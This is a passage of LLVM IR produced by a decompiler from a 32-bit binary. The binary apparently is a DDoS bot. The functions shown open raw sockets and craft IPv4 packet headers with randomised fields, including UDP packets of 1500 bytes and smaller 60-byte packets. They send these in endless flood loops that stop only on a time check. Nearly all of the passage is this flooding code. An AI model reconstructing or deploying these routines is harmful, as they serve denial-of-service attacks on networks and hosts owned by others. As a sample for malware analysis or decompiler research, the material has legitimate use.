  %v5_8049616 = and i1 %v4_8049616, %v3_8049616
  br i1 %v5_8049616, label %dec_label_pc_804963e, label %dec_label_pc_8049618

dec_label_pc_8049618:                             ; preds = %dec_label_pc_8049612
  store i32 %arg1, i32* %stack_var_-1596, align 4
  %v3_804962d = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8052700.49 to i32))
  store i32 %v3_804962d, i32* @eax, align 4
  store i32 1, i32* %stack_var_-1596, align 4
  %v1_8049639 = call i32 @function_804ec2c(i32 1)
  br label %dec_label_pc_804963e

dec_label_pc_804963e:                             ; preds = %dec_label_pc_8049612, %dec_label_pc_8049618
  %v1_8049641 = add i32 %arg4, 4
  %v1_8049644 = inttoptr i32 %v1_8049641 to i32*
  %v2_8049644 = load i32, i32* %v1_8049644, align 4
  store i32 %arg2, i32* %stack_var_-1596, align 4
  %v3_8049650 = call i32 @function_8049520(i32 %arg2, i32 %v2_8049644)
  %v1_804965b = add i32 %arg4, 8
  %v1_804965e = inttoptr i32 %v1_804965b to i32*
  %v2_804965e = load i32, i32* %v1_804965e, align 4
  store i32 %v2_804965e, i32* %stack_var_-1596, align 4
  %v1_8049663 = call i32 @function_804ead8(i32 %v2_804965e)
  %v1_804966e = add i32 %arg4, 12
  %v1_8049671 = inttoptr i32 %v1_804966e to i32*
  %v2_8049671 = load i32, i32* %v1_8049671, align 4
  store i32 %v2_8049671, i32* %stack_var_-1596, align 4
  %v1_8049676 = call i32 @function_804ead8(i32 %v2_8049671)
  %v2_804967e = ptrtoint i32* %stack_var_-1560 to i32
  %tmp33 = bitcast i32* %stack_var_-1540 to i16*
  %v15_8049699 = ptrtoint i32* %stack_var_-1532 to i32
  store i32 %v15_8049699, i32* %stack_var_-1596, align 4
  %v4_80496b5 = bitcast i32* %stack_var_-1532 to i8*
  %v5_80496b5 = call i32 @function_804d1d0(i8* %v4_80496b5, i32 10, i32 1472)
  store i32 %arg1, i32* %stack_var_-1596, align 4
  %v3_80496db = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_8052727.50 to i32))
  %v3_80496ea = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_80496ea, align 4
  %v1_80496fb = or i32 %v2_804967e, 1
  %v2_80496fb = inttoptr i32 %v1_80496fb to i8*
  store i8 0, i8* %v2_80496fb, align 1
  %v1_8049702 = or i32 %v2_804967e, 2
  %v2_8049702 = inttoptr i32 %v1_8049702 to i16*
  store i16 1500, i16* %v2_8049702, align 2
  %v1_804970b = add i32 %v2_804967e, 6
  %v2_804970b = inttoptr i32 %v1_804970b to i16*
  store i16 0, i16* %v2_804970b, align 2
  %v1_8049714 = add i32 %v2_804967e, 9
  %v2_8049714 = inttoptr i32 %v1_8049714 to i8*
  store i8 17, i8* %v2_8049714, align 1
  %v1_804971b = add i32 %v2_804967e, 8
  %v2_804971b = inttoptr i32 %v1_804971b to i8*
  store i8 64, i8* %v2_804971b, align 4
  %v2_8049725 = add i32 %v2_804967e, 16
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v3_8049650, i32* %v3_8049725, align 4
  %v1_804972b = urem i32 %tmp9, 65536
  store i32 %v1_804972b, i32* %stack_var_-1596, align 4
  %v1_8049731 = trunc i32 %tmp9 to i16
  %v2_8049731 = call i32 @function_804d468(i16 %v1_8049731)
  %v4_8049739 = ptrtoint i32* %stack_var_-1540 to i32
  %v1_804973c = trunc i32 %v2_8049731 to i16
  %v3_804973c = add i32 %v4_8049739, 4
  %v4_804973c = inttoptr i32 %v3_804973c to i16*
  store i16 %v1_804973c, i16* %v4_804973c, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i32 %v3_8049650, i32* @eax, align 4
  %v4_804975a = icmp eq i32 %v1_8049663, 0
  %v3_8049785 = or i32 %v4_8049739, 2
  %v4_8049785 = inttoptr i32 %v3_8049785 to i16*
  %v3_804979a = bitcast i32* %stack_var_-1560 to i16*
  %v3_80497a5 = add i32 %v4_8049739, 6
  %v4_80497a5 = inttoptr i32 %v3_80497a5 to i16*
  %v2_80497b3 = add i32 %v2_804967e, 12
  %v3_80497b3 = inttoptr i32 %v2_80497b3 to i32*
  %v3_80497c1 = add i32 %v2_804967e, 4
  %v4_80497c1 = inttoptr i32 %v3_80497c1 to i16*
  %v3_80497e1 = add i32 %v2_804967e, 10
  %v4_80497e1 = inttoptr i32 %v3_80497e1 to i16*
  %v2_80497f0 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804983b = add i32 %v1_8049676, %v2_80495c6
  %v1_8049763 = urem i32 %v1_8049663, 65536
  %v1_8049769 = trunc i32 %v1_8049663 to i16
  br label %dec_label_pc_804974c

dec_label_pc_804974c:                             ; preds = %dec_label_pc_8049855, %dec_label_pc_804963e
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804963e ], [ %v4_8049855, %dec_label_pc_8049855 ]
  %v1_804974c = call i32 @function_804e754(i32 %v3_8049650)
  store i32 %v4_8049739, i32* @eax, align 4
  %v1_8049757 = trunc i32 %v1_804974c to i16
  store i16 %v1_8049757, i16* %tmp33, align 4
  br i1 %v4_804975a, label %dec_label_pc_804977a, label %dec_label_pc_8049760

dec_label_pc_8049760:                             ; preds = %dec_label_pc_804974c
  store i32 %v1_8049763, i32* %stack_var_-1596, align 4
  %v2_8049769 = call i32 @function_804d468(i16 %v1_8049769)
  br label %dec_label_pc_8049789

dec_label_pc_804977a:                             ; preds = %dec_label_pc_804974c
  %v0_804977a = load i32, i32* %stack_var_-1596, align 4
  %v1_804977a = call i32 @function_804e754(i32 %v0_804977a)
  br label %dec_label_pc_8049789

dec_label_pc_8049789:                             ; preds = %dec_label_pc_8049760, %dec_label_pc_804977a
  %storemerge4.in = phi i32 [ %v2_8049769, %dec_label_pc_8049760 ], [ %v1_804977a, %dec_label_pc_804977a ]
  %storemerge = trunc i32 %storemerge4.in to i16
  store i16 %storemerge, i16* %v4_8049785, align 2
  store i32 %v2_804967e, i32* %stack_var_-1596, align 4
  %v4_804979a = call i32 @function_80489a9(i16* %v3_804979a, i32 1500)
  %v1_80497a5 = trunc i32 %v4_804979a to i16
  store i16 %v1_80497a5, i16* %v4_80497a5, align 2
  %v0_80497a9 = call i32 @function_80483ee()
  store i32 %v2_804967e, i32* @eax, align 4
  store i32 %v0_80497a9, i32* %v3_80497b3, align 4
  %v0_80497b6 = load i32, i32* %stack_var_-1596, align 4
  %v1_80497b6 = call i32 @function_804e754(i32 %v0_80497b6)
  %v1_80497c1 = trunc i32 %v1_80497b6 to i16
  store i16 %v1_80497c1, i16* %v4_80497c1, align 4
  store i32 %v2_804967e, i32* %stack_var_-1596, align 4
  %v4_80497d6 = call i32 @function_80489a9(i16* %v3_804979a, i32 1500)
  %v1_80497e1 = trunc i32 %v4_80497d6 to i16
  store i16 %v1_80497e1, i16* %v4_80497e1, align 2
  store i32 %v4_80495f8, i32* %stack_var_-1596, align 4
  %v7_804981f = call i32 @function_804d9d8(i32 %v4_80495f8, i32 %v2_804967e, i32 1500, i32 0, i32 %v2_80497f0, i32 16)
  store i32 %v7_804981f, i32* @eax, align 4
  %tmp = icmp ult i32 %stack_var_-40.0, 50
  br i1 %tmp, label %dec_label_pc_8049855, label %dec_label_pc_804982a

dec_label_pc_804982a:                             ; preds = %dec_label_pc_8049789
  store i32 0, i32* %stack_var_-1596, align 4
  %v2_8049831 = call i32 @function_804b750(i32* null)
  store i32 %v5_804983b, i32* @eax, align 4
  %v7_804983e = icmp ult i32 %v2_8049831, %v5_804983b
  br i1 %v7_804983e, label %dec_label_pc_8049855, label %dec_label_pc_8049842

dec_label_pc_8049842:                             ; preds = %dec_label_pc_804982a
  store i32 0, i32* %stack_var_-1596, align 4
  %v1_8049849 = call i32 @function_804ec2c(i32 0)
  store i32 %v1_8049849, i32* @eax, align 4
  br label %dec_label_pc_8049855

dec_label_pc_8049855:                             ; preds = %dec_label_pc_8049842, %dec_label_pc_804982a, %dec_label_pc_8049789
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_8049789 ], [ 0, %dec_label_pc_804982a ], [ 0, %dec_label_pc_8049842 ]
  %v4_8049855 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_804974c

dec_label_pc_804985d:                             ; preds = %dec_label_pc_80495af
  ret i32 %v1_80495d4

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v4_8049739, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804967e, { 10, 11, 3, 12, 0, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v1_8049663, { 1, 0, 2 }
  uselistorder i32 %v4_8049612, { 1, 0 }
  uselistorder i32 %v4_80495f8, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1596, { 2, 3, 4, 5, 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049789, { 1, 0 }
  uselistorder label %dec_label_pc_804963e, { 1, 0 }
  uselistorder label %dec_label_pc_8049612, { 1, 0 }
}

define i32 @function_804985f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804985f:
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-104 = alloca i8, align 1
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804985f = load i32, i32* @ebp, align 4
  store i32 %v0_804985f, i32* %stack_var_-4, align 4
  %v4_804985f = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804985f, i32* @ebp, align 4
  %v2_8049868 = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v2_8049868, i32* %stack_var_-284, align 4
  %v3_8049883 = bitcast i32* %stack_var_-252 to i16*
  %v4_8049883 = call i32 @function_804d1a8(i16* %v3_8049883, i32 ptrtoint (i32* @global_var_8052760.51 to i32), i32 80)
  store i32 0, i32* %stack_var_-284, align 4
  %v2_804989d = call i32 @function_804b750(i32* null)
  store i32 %arg2, i32* %stack_var_-284, align 4
  %v1_80498ab = call i32 @function_8048311(i32 %arg2)
  %v1_80498b0 = icmp eq i32 %v1_80498ab, 0
  %v1_80498b2 = icmp eq i1 %v1_80498b0, false
  br i1 %v1_80498b2, label %dec_label_pc_8049c56, label %dec_label_pc_80498b8

dec_label_pc_80498b8:                             ; preds = %dec_label_pc_804985f
  %v4_80498b8 = add i32 %arg3, -2
  %v9_80498b8 = sub i32 1, %arg3
  %v10_80498b8 = and i32 %v9_80498b8, %arg3
  %v11_80498b8 = icmp slt i32 %v10_80498b8, 0
  %v12_80498b8 = icmp eq i32 %v4_80498b8, 0
  %v13_80498b8 = icmp slt i32 %v4_80498b8, 0
  %v3_80498bc = icmp eq i1 %v13_80498b8, %v11_80498b8
  %v4_80498bc = icmp eq i1 %v12_80498b8, false
  %v5_80498bc = and i1 %v4_80498bc, %v3_80498bc
  br i1 %v5_80498bc, label %dec_label_pc_80498e4, label %dec_label_pc_80498be

dec_label_pc_80498be:                             ; preds = %dec_label_pc_80498b8
  store i32 %arg1, i32* %stack_var_-284, align 4
  %v2_80498d3 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80527b0.52 to i32))
  store i32 %v2_80498d3, i32* @eax, align 4
  store i32 1, i32* %stack_var_-284, align 4
  %v1_80498df = call i32 @function_804ec2c(i32 1)
  br label %dec_label_pc_80498e4

dec_label_pc_80498e4:                             ; preds = %dec_label_pc_80498b8, %dec_label_pc_80498be
  store i32 2, i32* %stack_var_-284, align 4
  %v3_80498fb = call i32 @function_804da58(i32 2, i32 3, i32 255)
  store i32 %v3_80498fb, i32* @eax, align 4
  %v5_8049903 = icmp slt i32 %v3_80498fb, 0
  %v1_8049907 = icmp eq i1 %v5_8049903, false
  br i1 %v1_8049907, label %dec_label_pc_8049932.preheader, label %dec_label_pc_8049909

dec_label_pc_8049909:                             ; preds = %dec_label_pc_80498e4
  store i32 1, i32* %stack_var_-284, align 4
  %v1_8049910 = call i32 @function_804ec2c(i32 1)
  br label %dec_label_pc_8049932.preheader

dec_label_pc_8049932.preheader:                   ; preds = %dec_label_pc_80498e4, %dec_label_pc_8049909
  br label %dec_label_pc_804991e

dec_label_pc_804991e:                             ; preds = %dec_label_pc_8049932.preheader, %dec_label_pc_804991e
  %storemerge72 = phi i32 [ 0, %dec_label_pc_8049932.preheader ], [ %v4_804992f, %dec_label_pc_804991e ]
  store i32 %storemerge72, i32* @edx, align 4
  %v0_8049924 = load i32, i32* @ebp, align 4
  %v2_8049924 = mul nuw nsw i32 %storemerge72, 4
  %v3_8049924 = add nuw nsw i32 %v2_8049924, -248
  %v4_8049924 = add i32 %v3_8049924, %v0_8049924
  %v5_8049924 = inttoptr i32 %v4_8049924 to i32*
  %v6_8049924 = load i32, i32* %v5_8049924, align 4
  %v1_804992b = trunc i32 %v6_8049924 to i8
  %v4_804992b = add nuw nsw i32 %storemerge72, -60
  %v5_804992b = add i32 %v4_804992b, %v0_8049924
  %v6_804992b = inttoptr i32 %v5_804992b to i8*
  store i8 %v1_804992b, i8* %v6_804992b, align 1
  %v4_804992f = add nuw nsw i32 %storemerge72, 1
  %exitcond = icmp eq i32 %v4_804992f, 20
  br i1 %exitcond, label %dec_label_pc_8049938, label %dec_label_pc_804991e

dec_label_pc_8049938:                             ; preds = %dec_label_pc_804991e
  %v1_804993b = add i32 %arg4, 4
  %v1_804993e = inttoptr i32 %v1_804993b to i32*
  %v2_804993e = load i32, i32* %v1_804993e, align 4
  store i32 %arg2, i32* %stack_var_-284, align 4
  %v2_804994a = call i32 @function_8049520(i32 %arg2, i32 %v2_804993e)
  %v1_8049955 = add i32 %arg4, 12
  %v1_8049958 = inttoptr i32 %v1_8049955 to i32*
  %v2_8049958 = load i32, i32* %v1_8049958, align 4
  store i32 %v2_8049958, i32* %stack_var_-284, align 4
  %v1_804995d = call i32 @function_804ead8(i32 %v2_8049958)
  store i32 %arg1, i32* %stack_var_-284, align 4
  %v2_8049986 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_80527d7.53 to i32))
  store i8 69, i8* %stack_var_-104, align 1
  %v1_8049a25 = add i32 %arg4, 8
  %v1_8049a28 = inttoptr i32 %v1_8049a25 to i32*
  %v2_8049a28 = load i32, i32* %v1_8049a28, align 4
  store i32 %v2_8049a28, i32* %stack_var_-284, align 4
  %v1_8049a2d = call i32 @function_804ead8(i32 %v2_8049a28)
  %v1_8049a32 = urem i32 %v1_8049a2d, 65536
  store i32 %v1_8049a32, i32* %stack_var_-284, align 4
  %v1_8049a38 = trunc i32 %v1_8049a2d to i16
  %v2_8049a38 = call i32 @function_804d468(i16 %v1_8049a38)
  %v1_8049a3d = urem i32 %v2_8049a38, 65536
  store i32 %v1_8049a3d, i32* @eax, align 4
  %v2_8049ae9 = ptrtoint i8* %stack_var_-104 to i32
  %v2_8049af7 = bitcast i8* %stack_var_-104 to i16*
  %v2_8049b83 = ptrtoint i32* %stack_var_-156 to i32
  %v2_8049b89 = ptrtoint i32* %stack_var_-144 to i32
  %v15_8049b8f = ptrtoint i32* %stack_var_-84 to i32
  %v12_8049bb3 = ptrtoint i32* %stack_var_-124 to i32
  %v15_8049bbd = ptrtoint i32* %stack_var_-64 to i32
  %v2_8049bdb = bitcast i32* %stack_var_-156 to i16*
  %v2_8049be7 = ptrtoint i32* %stack_var_-172 to i32
  %v5_8049c34 = add i32 %v1_804995d, %v2_804989d
  br label %dec_label_pc_8049a43

dec_label_pc_8049a43:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049938
  %stack_var_-32.0 = phi i32 [ %v1_8049a3d, %dec_label_pc_8049938 ], [ %stack_var_-32.1, %dec_label_pc_8049c4e ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_8049938 ], [ %v4_8049c4e, %dec_label_pc_8049c4e ]
  %v1_8049a43 = call i32 @function_804e754(i32 %stack_var_-32.0)
  %v2_8049a51 = load i32, i32* %v1_8049a28, align 4
  store i32 %v2_8049a51, i32* %stack_var_-284, align 4
  %v1_8049a56 = call i32 @function_804ead8(i32 %v2_8049a51)
  store i32 %v1_8049a56, i32* @eax, align 4
  %v1_8049a5b = icmp eq i32 %v1_8049a56, 0
  %v1_8049a5d = icmp eq i1 %v1_8049a5b, false
  br i1 %v1_8049a5d, label %dec_label_pc_8049a67, label %dec_label_pc_8049a5f

dec_label_pc_8049a5f:                             ; preds = %dec_label_pc_8049a43
  %v0_8049a5f = load i32, i32* %stack_var_-284, align 4
  %v1_8049a5f = call i32 @function_804e754(i32 %v0_8049a5f)
  br label %dec_label_pc_8049a67

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049a43, %dec_label_pc_8049a5f
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8049a43 ], [ %v1_8049a5f, %dec_label_pc_8049a5f ]
  %v0_8049a67 = call i32 @function_80483ee()
  store i32 60, i32* %stack_var_-284, align 4
  %v2_8049a7e = call i32 @function_804d468(i16 60)
  %v1_8049a83 = urem i32 %v2_8049a7e, 65536
  store i32 %v1_8049a83, i32* @eax, align 4
  %sext = mul i32 %v2_8049a7e, 65536
  %v1_8049a8a = sdiv i32 %sext, 65536
  %v2_8049a8a = call i32 @function_804e754(i32 %v1_8049a8a)
  %v1_8049aab = urem i32 %v1_8049a43, 65536
  store i32 %v1_8049aab, i32* %stack_var_-84, align 4
  %v1_8049ab5 = urem i32 %stack_var_-32.1, 65536
  store i32 %v1_8049ab5, i32* @eax, align 4
  %sext11 = mul i32 %v2_8049a8a, 65536
  %v1_8049abc = sdiv i32 %sext11, 65536
  %v2_8049abc = call i32 @function_804e754(i32 %v1_8049abc)
  store i32 2, i32* %stack_var_-172, align 4
  store i32 %v2_8049ae9, i32* %stack_var_-284, align 4
  %v3_8049af7 = call i32 @function_80489a9(i16* %v2_8049af7, i32 20)
  %v1_8049afc = urem i32 %v3_8049af7, 65536
  store i32 %v1_8049afc, i32* @eax, align 4
  %sext7 = mul i32 %v3_8049af7, 65536
  %v1_8049b03 = sdiv i32 %sext7, 65536
  %v2_8049b03 = call i32 @function_804e754(i32 %v1_8049b03)
  store i32 %v0_8049a67, i32* %stack_var_-156, align 4
  store i32 40, i32* %stack_var_-284, align 4
  %v2_8049b74 = call i32 @function_804d468(i16 40)
  store i32 %v15_8049b8f, i32* %stack_var_-284, align 4
  %v3_8049ba1 = call i32 @function_804d334(i32 %v15_8049b8f, i32 %v2_8049b89, i32 20)
  store i32 %v15_8049bbd, i32* %stack_var_-284, align 4
  %v3_8049bc3 = call i32 @function_804d334(i32 %v15_8049bbd, i32 %v12_8049bb3, i32 20)
  store i32 %v2_8049b83, i32* %stack_var_-284, align 4
  %v3_8049bdb = call i32 @function_80489a9(i16* %v2_8049bdb, i32 52)
  store i32 %v3_80498fb, i32* %stack_var_-284, align 4
  %v6_8049c18 = call i32 @function_804d9d8(i32 %v3_80498fb, i32 %v2_8049ae9, i32 60, i32 0, i32 %v2_8049be7, i32 16)
  store i32 %v6_8049c18, i32* @eax, align 4
  %tmp = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp, label %dec_label_pc_8049c4e, label %dec_label_pc_8049c23

dec_label_pc_8049c23:                             ; preds = %dec_label_pc_8049a67
  store i32 0, i32* %stack_var_-284, align 4
  %v2_8049c2a = call i32 @function_804b750(i32* null)
  store i32 %v5_8049c34, i32* @eax, align 4
  %v7_8049c37 = icmp ult i32 %v2_8049c2a, %v5_8049c34
  br i1 %v7_8049c37, label %dec_label_pc_8049c4e, label %dec_label_pc_8049c3b

dec_label_pc_8049c3b:                             ; preds = %dec_label_pc_8049c23
  store i32 0, i32* %stack_var_-284, align 4
  %v1_8049c42 = call i32 @function_804ec2c(i32 0)
  store i32 %v1_8049c42, i32* @eax, align 4
  br label %dec_label_pc_8049c4e

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049c3b, %dec_label_pc_8049c23, %dec_label_pc_8049a67
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_8049a67 ], [ 0, %dec_label_pc_8049c23 ], [ 0, %dec_label_pc_8049c3b ]
  %v4_8049c4e = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_8049a43

dec_label_pc_8049c56:                             ; preds = %dec_label_pc_804985f
  ret i32 %v1_80498ab

; uselistorder directives
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32 %v15_8049bbd, { 1, 0 }
  uselistorder i32 %v15_8049b8f, { 1, 0 }
  uselistorder i32 %v1_8049a3d, { 1, 0 }
  uselistorder i32 %v1_8049a2d, { 1, 0 }
  uselistorder i32 %storemerge72, { 2, 3, 0, 1 }
  uselistorder i32 %v3_80498fb, { 1, 0, 2, 3 }
  uselistorder i32 %v4_80498b8, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-284, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a67, { 1, 0 }
  uselistorder label %dec_label_pc_804991e, { 1, 0 }
  uselistorder label %dec_label_pc_8049932.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80498e4, { 1, 0 }
}

define i32 @function_8049c58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
dec_label_pc_8049c58:
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp45 = inttoptr i32 %arg1 to i8*
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-204 = alloca i8*, align 4
  store i8* null, i8** %stack_var_-204, align 4
  %v3_8049c70 = call i32 @function_804b750(i32* null)
  %v4_8049c7b = inttoptr i32 %arg2 to i8*
  store i8* %v4_8049c7b, i8** %stack_var_-204, align 4
  %v2_8049c7e = call i32 @function_8048311(i32 %arg2)
  %v1_8049c83 = icmp eq i32 %v2_8049c7e, 0
  %v1_8049c85 = icmp eq i1 %v1_8049c83, false
  br i1 %v1_8049c85, label %dec_label_pc_8049fe3, label %dec_label_pc_8049c8b

dec_label_pc_8049c8b:                             ; preds = %dec_label_pc_8049c58
  %v4_8049c8b = add i32 %arg3, -1
  %v9_8049c8b = sub i32 0, %arg3
  %v10_8049c8b = and i32 %arg3, %v9_8049c8b
  %v11_8049c8b = icmp slt i32 %v10_8049c8b, 0
  %v12_8049c8b = icmp eq i32 %v4_8049c8b, 0
  %v13_8049c8b = icmp slt i32 %v4_8049c8b, 0
  %v3_8049c8f = icmp eq i1 %v13_8049c8b, %v11_8049c8b
  %v4_8049c8f = icmp eq i1 %v12_8049c8b, false
  %v5_8049c8f = and i1 %v4_8049c8f, %v3_8049c8f
  br i1 %v5_8049c8f, label %dec_label_pc_8049cb7, label %dec_label_pc_8049c91

dec_label_pc_8049c91:                             ; preds = %dec_label_pc_8049c8b
  store i8* %tmp45, i8** %stack_var_-204, align 4
  %v4_8049ca6 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_80527f0.54 to i32))
  store i32 %v4_8049ca6, i32* @eax, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-204, align 4
  %v2_8049cb2 = call i32 @function_804ec2c(i32 1)
  br label %dec_label_pc_8049cb7

dec_label_pc_8049cb7:                             ; preds = %dec_label_pc_8049c8b, %dec_label_pc_8049c91
  %v1_8049cba = add i32 %arg4, 8
  %v1_8049cbd = inttoptr i32 %v1_8049cba to i32*
  %v2_8049cbd = load i32, i32* %v1_8049cbd, align 4
  %v4_8049cbf = inttoptr i32 %v2_8049cbd to i8*
  store i8* %v4_8049cbf, i8** %stack_var_-204, align 4
  %v2_8049cc2 = call i32 @function_804ead8(i32 %v2_8049cbd)
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-204, align 4
  %v5_8049ce1 = call i32 @function_804da58(i32 2, i32 3, i32 255)
  store i32 %v5_8049ce1, i32* @eax, align 4
  %v5_8049ce9 = icmp slt i32 %v5_8049ce1, 0
  %v1_8049ced = icmp eq i1 %v5_8049ce9, false
  br i1 %v1_8049ced, label %dec_label_pc_8049cfb, label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %dec_label_pc_8049cb7
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-204, align 4
  %v2_8049cf6 = call i32 @function_804ec2c(i32 1)
  br label %dec_label_pc_8049cfb

dec_label_pc_8049cfb:                             ; preds = %dec_label_pc_8049cb7, %dec_label_pc_8049cef
  store i8* null, i8** %stack_var_-204, align 4
  %v3_8049d02 = call i32 @function_804b750(i32* null)
  store i32 %v3_8049d02, i32* @ebx, align 4
  %v0_8049d09 = call i32 @function_804b64c()
  %v1_8049d0e = load i32, i32* @ebx, align 4
  %v2_8049d0e = xor i32 %v1_8049d0e, %v0_8049d09
  store i32 %v2_8049d0e, i32* @eax, align 4
  %v4_8049d10 = inttoptr i32 %v2_8049d0e to i8*
  store i8* %v4_8049d10, i8** %stack_var_-204, align 4
  %v2_8049d13 = call i32 @function_804e858(i32 %v2_8049d0e)
  store i32 %v2_8049d13, i32* @eax, align 4
  %v0_8049d18 = load i8*, i8** %stack_var_-204, align 4
  %v1_8049d18 = ptrtoint i8* %v0_8049d18 to i32
  %v2_8049d18 = call i32 @function_804e754(i32 %v1_8049d18)
  store i32 %v2_8049d18, i32* @edx, align 4
  %v2_8049d2a = ptrtoint i8* %stack_var_-100 to i32
  %v15_8049d2d = ptrtoint i32* %stack_var_-60 to i32
  %tmp76 = bitcast i32* %stack_var_-60 to i8*
  store i8* %tmp76, i8** %stack_var_-204, align 4
  %v6_8049d33 = call i32 @function_804d1d0(i8* %tmp76, i32 %v2_8049d18, i32 1400)
  %v1_8049d3b = add i32 %arg4, 4
  %v1_8049d3e = inttoptr i32 %v1_8049d3b to i32*
  %v2_8049d3e = load i32, i32* %v1_8049d3e, align 4
  store i8* %v4_8049c7b, i8** %stack_var_-204, align 4
  %v4_8049d4a = call i32 @function_8049520(i32 %arg2, i32 %v2_8049d3e)
  store i8* %tmp45, i8** %stack_var_-204, align 4
  %v4_8049d73 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_8052814.55 to i32))
  %tmp77 = bitcast i8* %stack_var_-100 to i16*
  %v2_8049f0b = ptrtoint i32* %stack_var_-140 to i32
  %v15_8049f11 = ptrtoint i32* %stack_var_-80 to i32
  %tmp78 = bitcast i32* %stack_var_-80 to i8*
  %v3_8049f45 = ptrtoint i32* %stack_var_-120 to i32
  %tmp79 = bitcast i32* %stack_var_-152 to i8*
  %tmp80 = bitcast i32* %stack_var_-152 to i16*
  %v2_8049f69 = ptrtoint i32* %stack_var_-168 to i32
  %v4_8049f97 = inttoptr i32 %v5_8049ce1 to i8*
  %v5_8049fb6 = add i32 %v2_8049cc2, %v3_8049c70
  br label %dec_label_pc_8049d78

dec_label_pc_8049d78:                             ; preds = %dec_label_pc_8049fc4, %dec_label_pc_8049cfb
  %stack_var_-32.0 = phi i32 [ %tmp14, %dec_label_pc_8049cfb ], [ %v4_8049fc4, %dec_label_pc_8049fc4 ]
  %v0_8049d78 = call i32 @function_80483ee()
  store i8 69, i8* %stack_var_-100, align 1
  store i8* inttoptr (i32 1440 to i8*), i8** %stack_var_-204, align 4
  %v3_8049da9 = call i32 @function_804d468(i16 1440)
  %v1_8049dae = urem i32 %v3_8049da9, 65536
  store i32 %v1_8049dae, i32* @eax, align 4
  %sext = mul i32 %v3_8049da9, 65536
  %v1_8049db5 = sdiv i32 %sext, 65536
  %v2_8049db5 = call i32 @function_804e754(i32 %v1_8049db5)
  store i32 %v4_8049d4a, i32* @eax, align 4
  %sext12 = mul i32 %v2_8049db5, 65536
  %v1_8049de1 = sdiv i32 %sext12, 65536
  %v2_8049de1 = call i32 @function_804e754(i32 %v1_8049de1)
  %v1_8049de6 = urem i32 %v2_8049de1, 65536
  store i32 %v1_8049de6, i32* @eax, align 4
  store i32 %v1_8049de6, i32* %stack_var_-80, align 4
  %v1_8049ded = call i32 @function_804e754(i32 %v1_8049de6)
  %v1_8049df2 = urem i32 %v1_8049ded, 65536
  store i32 %v1_8049df2, i32* @eax, align 4
  %sext9 = mul i32 %v1_8049ded, 65536
  %v1_8049df9 = sdiv i32 %sext9, 65536
  %v2_8049df9 = call i32 @function_804e754(i32 %v1_8049df9)
